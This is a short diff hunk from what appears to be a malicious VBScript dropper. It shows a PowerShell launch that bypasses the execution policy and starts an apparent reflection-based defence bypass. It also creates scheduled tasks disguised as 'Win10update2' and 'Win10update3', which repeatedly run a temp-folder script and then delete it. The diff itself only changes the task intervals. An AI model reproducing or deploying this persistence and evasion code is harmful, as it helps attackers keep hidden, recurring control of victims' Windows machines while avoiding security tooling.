@@ -15,9 +15,9 @@ Twoshell.run "powershell.exe -nop -exec bypass; [Ref].Assembly.GetType('System.M
 
 
 Set Threeshell = wscript.createobject("wscript.shell")
-Threeshell.run "schtasks /create /sc minute /mo 3 /tn Win10update2 /tr ""%tmp%\windows10two.vbs""", 0, False
+Threeshell.run "schtasks /create /sc minute /mo 4 /tn Win10update2 /tr ""%tmp%\windows10two.vbs""", 0, False
 
 
 Set Fourshell = wscript.createobject("wscript.shell")
-Fourshell.run "schtasks /create /sc minute /mo 4 /tn Win10update3 /tr ""del %tmp%\windows10two.vbs """, 0, False
+Fourshell.run "schtasks /create /sc minute /mo 5 /tn Win10update3 /tr ""del %tmp%\windows10two.vbs """, 0, False
 
